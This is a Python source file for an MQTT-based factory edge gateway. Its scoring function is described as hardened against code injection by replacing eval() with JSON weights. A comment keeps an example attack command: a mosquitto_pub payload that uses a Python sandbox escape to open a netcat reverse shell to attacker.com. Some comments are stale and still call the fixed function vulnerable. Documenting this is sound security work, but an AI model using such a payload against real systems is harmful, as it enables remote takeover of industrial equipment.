import os
import sys
import json
import sqlite3
import logging
import time
import paho.mqtt.client as mqtt
from datetime import datetime

# Configure logging for the Industrial IoT (IIoT) Edge Gateway
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - IIoTGateway - %(levelname)s - %(message)s'
)
logger = logging.getLogger("MQTTEdgeGateway")

DB_FILE = "machine_health.db"
MQTT_BROKER = os.environ.get("MQTT_BROKER", "127.0.0.1")
MQTT_PORT = int(os.environ.get("MQTT_PORT", 1883))
MQTT_TOPIC = "factory/floor/+/telemetry"

def init_health_db():
    """Initializes the local SQLite database for predictive maintenance logs."""
    if os.path.exists(DB_FILE):
        return

    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()

    cursor.execute('''
        CREATE TABLE health_logs (
            log_id INTEGER PRIMARY KEY AUTOINCREMENT,
            machine_id TEXT NOT NULL,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            vibration REAL NOT NULL,
            temperature REAL NOT NULL,
            computed_health_score REAL NOT NULL,
            needs_maintenance BOOLEAN NOT NULL
        )
    ''')

    conn.commit()
    conn.close()
    logger.info("IIoT health database initialized.")

def save_health_record(machine_id: str, vibration: float, temp: float, score: float, maintenance: bool):
    """Persists machine telemetry and calculated scores to the local database."""
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute(
            '''INSERT INTO health_logs 
               (machine_id, vibration, temperature, computed_health_score, needs_maintenance) 
               VALUES (?, ?, ?, ?, ?)''',
            (machine_id, vibration, temp, score, maintenance)
        )
        conn.commit()
        conn.close()
    except sqlite3.Error as e:
        logger.error(f"Database error saving record for {machine_id}: {e}")

def calculate_predictive_maintenance_score(sensor_metrics: dict, scoring_config_json: str) -> float:
    """
    SECURE: Prevents Code Injection (CWE-94) by replacing arbitrary code 
    execution (eval) with a structured, JSON-based weighted scoring model.
    """
    import json
    
    logger.debug(f"Applying secure scoring model to metrics: {sensor_metrics}")
    
    try:
        # Secure: We remove the dangerous eval() function entirely.
        # Executing untrusted strings as Python code on an edge gateway is a 
        # critical vulnerability. Instead, we implement a declarative model 
        # where the cloud controller submits a JSON configuration defining 
        # weights and thresholds.
        # Note: The central controller must be updated to send JSON configuration 
        # rather than raw Python formulas.
        
        config = json.loads(scoring_config_json)
        
        if not isinstance(config, dict):
            logger.warning("Scoring configuration must be a valid JSON object.")
            return 100.0
            
        # Extract explicitly expected parameters with safe defaults
        base_score = float(config.get("base_score", 100.0))
        vib_weight = float(config.get("vib_weight", 0.0))
        temp_weight = float(config.get("temp_weight", 0.0))
        
        vib_val = float(sensor_metrics.get("vib", 0.0))
        temp_val = float(sensor_metrics.get("temp", 0.0))
        
        # Safely calculate the health score using explicit, standard arithmetic
        health_score = base_score - (vib_val * vib_weight) - (temp_val * temp_weight)
        
        # Enforce logical business boundaries on the score (e.g., 0.0 to 100.0)
        health_score = max(0.0, min(100.0, health_score))
        
        return float(health_score)
        
    except json.JSONDecodeError as e:
        logger.error(f"Failed to parse scoring configuration as JSON: {e}")
        return 100.0
    except (ValueError, TypeError) as e:
        logger.error(f"Type conversion error in secure scoring calculation: {e}")
        return 100.0
    except Exception as e:
        logger.error(f"Unexpected error calculating secure health score: {e}")
        return 100.0

def on_connect(client, userdata, flags, rc):
    """Callback triggered when the MQTT client successfully connects to the broker."""
    if rc == 0:
        logger.info(f"Successfully connected to MQTT broker at {MQTT_BROKER}:{MQTT_PORT}")
        client.subscribe(MQTT_TOPIC)
        logger.info(f"Subscribed to topic pattern: {MQTT_TOPIC}")
    else:
        logger.error(f"Failed to connect to MQTT broker. Return code: {rc}")

def on_message(client, userdata, msg):
    """Callback triggered when a new message is received on a subscribed topic."""
    topic = msg.topic
    payload = msg.payload.decode('utf-8')
    logger.info(f"Received message on topic {topic}")

    try:
        data = json.loads(payload)
        
        # Extract routing and sensor data
        machine_id = topic.split('/')[2]
        vibration = float(data.get("vibration", 0.0))
        temperature = float(data.get("temperature", 0.0))
        
        # The algorithm is dynamically provided in the payload for edge computation
        algorithm = data.get("scoring_algorithm")
        
        if not algorithm:
            logger.warning(f"Payload from {machine_id} missing 'scoring_algorithm'. Dropping.")
            return

        sensor_metrics = {
            "vib": vibration,
            "temp": temperature
        }

        # Pass the untrusted string directly to the vulnerable function
        score = calculate_predictive_maintenance_score(sensor_metrics, algorithm)
        
        # Business logic: If health score drops below 40.0, flag for maintenance
        needs_maintenance = score < 40.0
        
        if needs_maintenance:
            logger.warning(f"CRITICAL: Machine {machine_id} health score ({score:.2f}) indicates maintenance required!")
            
        save_health_record(machine_id, vibration, temperature, score, needs_maintenance)

    except json.JSONDecodeError:
        logger.error(f"Invalid JSON payload received on {topic}")
    except ValueError:
        logger.error(f"Invalid data types in telemetry payload on {topic}")
    except Exception as e:
        logger.error(f"Unexpected error processing message on {topic}: {e}")

def main():
    """Main entrypoint for the MQTT Edge Gateway."""
    init_health_db()
    
    client = mqtt.Client(client_id="FactoryEdgeGateway_01")
    client.on_connect = on_connect
    client.on_message = on_message
    
    try:
        client.connect(MQTT_BROKER, MQTT_PORT, 60)
    except ConnectionRefusedError:
        logger.error(f"Connection refused by MQTT broker at {MQTT_BROKER}:{MQTT_PORT}. Is it running?")
        sys.exit(1)

    # Example Malicious Trigger:
    # 1. Attacker identifies the unauthenticated or weakly authenticated MQTT broker.
    # 2. Attacker publishes a crafted JSON payload to a telemetry topic using mosquitto_pub:
    #
    #    mosquitto_pub -h 127.0.0.1 -t "factory/floor/machine_05/telemetry" -m '{
    #      "vibration": 1.2,
    #      "temperature": 45.0,
    #      "scoring_algorithm": "[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == \"catch_warnings\"][0]()._module.__builtins__[\"__import__\"](\"os\").system(\"nc -e /bin/sh attacker.com 4444\") or 0.0"
    #    }'
    #
    # 3. The edge gateway receives the message, parses the JSON, and evaluates the 
    #    malicious scoring_algorithm string, granting RCE to the attacker.

    logger.info("Starting MQTT Loop. Waiting for telemetry...")
    try:
        client.loop_forever()
    except KeyboardInterrupt:
        logger.info("Shutting down IIoT Edge Gateway...")
        client.disconnect()

if __name__ == "__main__":
    main()
